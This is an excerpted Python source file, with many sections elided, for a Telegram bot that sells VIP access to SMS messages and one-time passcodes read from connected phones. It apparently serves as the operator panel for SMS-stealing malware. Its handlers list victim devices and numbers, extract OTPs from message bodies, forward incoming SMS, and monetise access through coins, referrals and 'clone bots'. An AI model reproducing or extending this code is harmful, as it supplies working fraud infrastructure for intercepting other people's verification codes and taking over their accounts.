...
"""
════════════════════════════════════════════════════════════
        OTP PANEL BOT — SUPREME PREMIUM EDITION v4.1
   Custom UI | VIP & Clone Features | 1000+ Concurrency
════════════════════════════════════════════════════════════
"""
...
async def handle_ping(request):
    return web.Response(text="Supreme Premium Bot is Running 24/7 on Render!")
...
async def start_web_server():
    ...
    await site.start()
    tlog(f"🌐 Async Web Server started on port {port}")
...
async def cleanup_cooldowns():
    """Prevents memory leak by clearing old cooldowns."""
    while True:
...
# ════════════════════════════════════════════════════════════
#  PREMIUM UI & MENUS (WITH VIP, REFER & CLONE RESTORED)
# ════════════════════════════════════════════════════════════
def get_premium_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    """Returns a highly professional, arranged reply keyboard including VIP & Referral features."""
    keys = [
        [KeyboardButton("📱 Live Devices"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("🔑 Recent OTPs"), KeyboardButton("🏆 Leaderboard")]
    ]
    
    # Only show VIP/Clone options on the main bot
    if bot_token == TOKEN:
        bots_created = all_users.get(chat_id, {}).get("bots_created", 0) if chat_id else 0
        req_bot_coins = 20 + (bots_created * 10)
        keys.append([KeyboardButton("👑 Buy VIP (20 🪙)"), KeyboardButton("💸 Refer & Earn")])
        keys.append([KeyboardButton(f"🤖 Create Clone Bot ({req_bot_coins} 🪙)"), KeyboardButton("👤 My Profile")])
    else:
...
def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    ...
    for d in devices[start: start + PAGE_SIZE]:
        ...
        lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}" if d.numbers else f"{icon} ⚙️ {tag}{d.name} ({d.id[:6]})"
...
def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    ...
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            lbl = f"🟢 📱 {tag}{' & '.join(d.numbers)}" if d.numbers else f"🟢 ⚙️ {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
...
def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        ...
        [InlineKeyboardButton("🎁 Gift Coins", callback_data="admin_gift_coins"),
         InlineKeyboardButton("📊 Bot Status", callback_data="cmd_status")],
        [InlineKeyboardButton("➕ Add DB", callback_data="admin_add_firebase")]
    ]
    if bot_token != TOKEN:
        keys[-1].append(InlineKeyboardButton("🔗 Custom DB", callback_data="add_custom_db"))
...
def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Share Referral Link To Earn Coins",
...
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    await update.message.reply_text(
        ...
        reply_markup=get_premium_menu(is_admin, bot_token, chat_id), parse_mode="HTML")
...
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if text == "📱 Live Devices":
        ...
        if not is_vip(bot_token, chat_id):
            return await update.message.reply_text("🚫 VIP Access Required!", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else None)
        ...
        if not is_vip(bot_token, chat_id): return await update.message.reply_text("🚫 VIP required.")
        pending_action[chat_id] = {"action": "search_number"}
        await update.message.reply_text("🔍 Enter minimum 4 digits to search:\n\n❌ Cancel: /cancel")
        
    elif text == "🔑 Recent OTPs":
        if not is_vip(bot_token, chat_id): return await update.message.reply_text("🚫 VIP required.", reply_markup=get_vip_denied_keyboard(chat_id) if is_main_bot else None)
        ...
        for d in devices:
            ...
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                if otp: found.append((otp, d.numbers[0] if d.numbers else d.name, sms.get("sender") or "?", sms_date(sms), d.db_tag))
            if len(found) >= 10: break
        if not found: return await wait_msg.edit_text("📭 No OTPs found.")
        otp_text = "🔑 <b>RECENT OTPS</b>\n━━━━━━━━━━━━━━━━━━\n"
        for otp, label, sender, date, tag in found[:10]:
            otp_text += f"<code>{otp}</code> — {label} ({sender}) [{tag}]\n"
        await wait_msg.edit_text(otp_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")

    elif text == "👑 Buy VIP (20 🪙)" and is_main_bot:
        if users_db[chat_id].get("coins", 0) >= 20:
            ...
            await update.message.reply_text("✅ <b>VIP Purchased!</b> (10 Hours added)", parse_mode="HTML")
        else: await update.message.reply_text("❌ Insufficient coins.", reply_markup=get_vip_denied_keyboard(chat_id))

    elif text == "💸 Refer & Earn" and is_main_bot:
        link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        await update.message.reply_text(f"💸 <b>Refer & Earn</b>\n\n<code>{link}</code>\n\nShare to earn +10 coins per user!", parse_mode="HTML")

    elif text.startswith("🤖 Create Clone Bot") and is_main_bot:
    ...
    elif text == "📊 Bot Status" and is_admin:
        devices = await get_all_devices(bot_token)
        online = sum(1 for d in devices if d.status == "online")
        await update.message.reply_text(
            f"📊 <b>STATUS</b>\n━━━━━━━━━━━━━━━━━━\n📱 Total: {len(devices)}\n🟢 Online: {online}  |  🔴 Offline: {len(devices) - online}",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="cmd_status"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
    ...
    # --- PENDING ACTIONS PROCESSING ---
        ...
        if action == "search_number":
            ...
            if len(search_term) < 4: return await update.message.reply_text("⚠️ Need at least 4 digits.")
            devices = await get_all_devices(bot_token)
            found = [d for d in devices if any(search_term in num for num in d.numbers)]
            if not found: return await update.message.reply_text("📭 No matches found.")
            rows = [[InlineKeyboardButton(f"{'🟢' if d.status=='online' else '🔴'} 📱 [{' & '.join(d.numbers)}]", callback_data=f"sel:{d.id}")] for d in found[:10]]
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            await update.message.reply_text(f"🔍 Results for {search_term}", reply_markup=InlineKeyboardMarkup(rows))
            ...
            if all_users[chat_id].get("coins", 0) < req_coins: return await update.message.reply_text("❌ Insufficient coins.")
            if not re.match(r"^\d+:[A-Za-z0-9_-]+$", text): return await update.message.reply_text("⚠️ Invalid token format.")
            ...
            try:
                ...
                await update.message.reply_text("Menu Updated:", reply_markup=get_premium_menu(is_admin, bot_token, chat_id))
...
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if users_db.get(chat_id, {}).get("banned") or is_spamming(chat_id): return await query.answer("Action blocked.", show_alert=True)
    await query.answer()
    ...
    if data == "home":
        ...
        text = (f"📱 <b>CONNECTED</b>\n━━━━━━━━━━━━━━━━━━\nNumber: {device.numbers[0] if device.numbers else device.name}\n"
        ...
        body_parts, btns = [], []
        for sms in smss:
            b = sms.get("body") or sms.get("message") or ""
            otp = extract_otp(b)
            if otp: btns.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data="noop")])
            body_parts.append(f"📩 From: {sms.get('sender','?')}\n💬 {b}")
        
        full = f"📩 <b>MESSAGES ({len(smss)})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(body_parts)
        if len(full) > 4000: full = full[:4000] + "..."
        btns.append([InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")])
        await safe_edit(query, full, reply_markup=InlineKeyboardMarkup(btns))
        ...
        await ctx.bot.send_message(chat_id, "✅ <b>Verified!</b>", reply_markup=get_premium_menu(is_admin, bot_token, chat_id), parse_mode="HTML")
...
async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    label = device.numbers[0] if device.numbers else device.name
    otp = extract_otp(body)
    ...
    for bot_token, chat_dict in user_focus.items():
        if bot_token != TOKEN:
            ...
            app_to_use, users_db = _main_app, all_users
...
def main():
    ...
    print("═" * 56)
    print("  🤖 OTP PANEL BOT — SUPREME PREMIUM EDITION v4.1")
    print("═" * 56)
